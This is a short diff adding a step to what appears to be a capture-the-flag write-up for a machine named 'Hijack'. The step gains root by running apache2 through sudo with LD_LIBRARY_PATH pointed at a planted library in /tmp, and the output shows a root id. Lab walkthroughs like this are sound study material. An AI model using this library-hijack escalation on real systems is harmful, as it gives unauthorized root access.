@@ -241,3 +241,11 @@ rick@Hijack:~$
 to get the root
 https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/
 
+
+```bash
+rick@Hijack:/home/rick$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2                     
+/usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
+root@Hijack:/home/rick# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
